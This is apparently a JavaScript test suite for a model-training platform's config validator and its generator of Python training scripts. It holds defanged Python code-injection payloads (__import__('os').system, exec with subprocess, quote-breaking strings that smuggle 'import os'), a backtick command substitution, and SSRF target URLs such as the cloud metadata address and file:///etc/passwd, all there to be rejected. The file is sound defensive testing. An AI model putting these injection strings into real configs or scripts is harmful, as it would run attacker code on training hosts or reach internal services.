import { describe, expect, it } from "vitest";
import {
    validateTrainingConfig,
    validateTrainingUrl,
    validateModelName,
    looksLikeCode,
    TrainingConfigError
} from "@infernetprotocol/config/training-config";
import { buildUnslothScript } from "../apps/cli/lib/training/unsloth-script.js";

// Shapes of the payloads that were actually submitted (Oct/Nov 2026), defanged.
const IMPORT_PAYLOAD = "[__import__('os').system('echo MARKER'), __import__('urllib.request',fromlist=['u']).request.urlopen('https://example.invalid/x').read(), 1//0][2]";
const EXEC_PAYLOAD = "(exec('''\nimport os, subprocess\nsubprocess.run('id', shell=True)\n''') or 0)";

function thrown(fn) {
    try {
        fn();
    } catch (e) {
        return e;
    }
    throw new Error("expected a throw");
}

describe("validateTrainingConfig", () => {
    it("accepts the documented config and normalises numbers", () => {
        const out = validateTrainingConfig({
            name: "my-finetune",
            base_model: "unsloth/Qwen2.5-7B-Instruct",
            training: { epochs: 3, learning_rate: "2.0e-4", batch_size: 4, gradient_accumulation_steps: 4, max_seq_len: 2048, seed: 42 },
            lora: { rank: 16, alpha: 32, dropout: 0.05, target_modules: ["q_proj", "v_proj"] },
            input: { dataset: "./data/train.jsonl", format: "chatml", validation_split: 0.1 },
            resources: { min_vram_gb: 8, allow_preemptible: false }
        });
        expect(out.training.learning_rate).toBe(0.0002);
        expect(out.training.max_seq_len).toBe(2048);
        expect(out.lora.target_modules).toEqual(["q_proj", "v_proj"]);
    });

    it("treats a missing config as empty", () => {
        expect(validateTrainingConfig(undefined)).toEqual({});
        expect(validateTrainingConfig(null)).toEqual({});
    });

    it("refuses the __import__ payload as an attack", () => {
        const e = thrown(() => validateTrainingConfig({ training: { max_seq_len: IMPORT_PAYLOAD } }));
        expect(e).toBeInstanceOf(TrainingConfigError);
        expect(e.status).toBe(400);
        expect(e.field).toBe("training.max_seq_len");
        expect(e.attack).toBe(true);
    });

    it("refuses the exec payload as an attack", () => {
        const e = thrown(() => validateTrainingConfig({ training: { max_seq_len: EXEC_PAYLOAD } }));
        expect(e.attack).toBe(true);
    });

    it("refuses a plain wrong value without calling it an attack", () => {
        const e = thrown(() => validateTrainingConfig({ training: { epochs: "three" } }));
        expect(e.attack).toBe(false);
        expect(e.message).toMatch(/training\.epochs/);
    });

    it("refuses out-of-range, non-integer and non-finite numbers", () => {
        expect(() => validateTrainingConfig({ training: { epochs: 0 } })).toThrow(/between/);
        expect(() => validateTrainingConfig({ training: { batch_size: 2.5 } })).toThrow(/integer/);
        expect(() => validateTrainingConfig({ lora: { dropout: Infinity } })).toThrow();
        expect(() => validateTrainingConfig({ lora: { dropout: "1e400" } })).toThrow();
    });

    it("refuses unknown keys anywhere a value reaches a script", () => {
        expect(() => validateTrainingConfig({ training: { optimizer: "adamw" } })).toThrow(/not a known setting/);
        expect(() => validateTrainingConfig({ evil: 1 })).toThrow(/not a known setting/);
    });

    it("refuses code in metadata and bad module names", () => {
        expect(thrown(() => validateTrainingConfig({ input: { dataset: "x`id`" } })).attack).toBe(true);
        expect(() => validateTrainingConfig({ lora: { target_modules: ["q_proj'); import os; ('"] } })).toThrow();
    });

    it("refuses non-objects and oversized configs", () => {
        expect(() => validateTrainingConfig("x")).toThrow();
        expect(() => validateTrainingConfig([1])).toThrow();
        expect(() => validateTrainingConfig({ input: { notes: "a".repeat(250) }, outputs: Object.fromEntries(Array.from({ length: 100 }, (_, i) => [`k${i}`, "b".repeat(200)])) })).toThrow(/too large/);
    });
});

describe("validateModelName", () => {
    it("accepts HF repos and Ollama tags", () => {
        expect(validateModelName("Qwen/Qwen2.5-0.5B-Instruct")).toBe("Qwen/Qwen2.5-0.5B-Instruct");
        expect(validateModelName("qwen2.5:0.5b")).toBe("qwen2.5:0.5b");
    });
    it("refuses quotes and code", () => {
        expect(() => validateModelName('x"); import os; ("')).toThrow();
        expect(() => validateModelName("")).toThrow();
    });
});

describe("validateTrainingUrl", () => {
    it("accepts public https and the documented http daemon URL", () => {
        expect(validateTrainingUrl("https://huggingface.co/datasets/x/resolve/main", "u")).toMatch(/^https:/);
        expect(validateTrainingUrl("http://203.0.113.10:8080/v1/training/shards/run-abc", "u")).toMatch(/^http:/);
    });
    it("refuses loopback, private, metadata, credentialed and non-http URLs", () => {
        for (const u of [
            "http://127.0.0.1:1/probe",
            "http://172.17.0.1:8000/x",
            "https://127.0.0.1:1/probe",
            "https://localhost/x",
            "https://10.1.2.3/x",
            "https://192.168.1.1/x",
            "https://169.254.169.254/latest",
            "https://[::1]/x",
            "https://user:pw@example.com/x",
            "file:///etc/passwd",
            "not a url"
        ]) {
            expect(() => validateTrainingUrl(u, "dataset_base_url"), u).toThrow(TrainingConfigError);
        }
    });
});

describe("looksLikeCode", () => {
    it("flags payloads and leaves normal text alone", () => {
        expect(looksLikeCode(IMPORT_PAYLOAD)).toBe(true);
        expect(looksLikeCode(EXEC_PAYLOAD)).toBe(true);
        expect(looksLikeCode("my-finetune v2 (chatml)")).toBe(false);
        expect(looksLikeCode("unsloth/Qwen2.5-7B-Instruct")).toBe(false);
    });
});

describe("buildUnslothScript", () => {
    it("renders numbers from a good config", () => {
        const py = buildUnslothScript({ trainConfig: { base_model: "qwen2.5:0.5b", training: { max_seq_len: "1024", epochs: 2 }, lora: { rank: 8 } } });
        expect(py).toContain("max_seq_length=1024,");
        expect(py).toContain("num_train_epochs=2,");
        expect(py).toContain("r=8,");
    });

    it("never renders a payload into Python", () => {
        expect(() => buildUnslothScript({ trainConfig: { base_model: "qwen2.5:0.5b", training: { max_seq_len: IMPORT_PAYLOAD } } })).toThrow(TrainingConfigError);
        expect(() => buildUnslothScript({ trainConfig: { base_model: "qwen2.5:0.5b", training: { max_seq_len: EXEC_PAYLOAD } } })).toThrow(TrainingConfigError);
        expect(() => buildUnslothScript({ trainConfig: { base_model: 'x"); __import__("os").system("id"); ("' } })).toThrow(TrainingConfigError);
        expect(() => buildUnslothScript({ trainConfig: { lora: { target_modules: ["q_proj\"]; import os #"] } } })).toThrow(TrainingConfigError);
    });
});
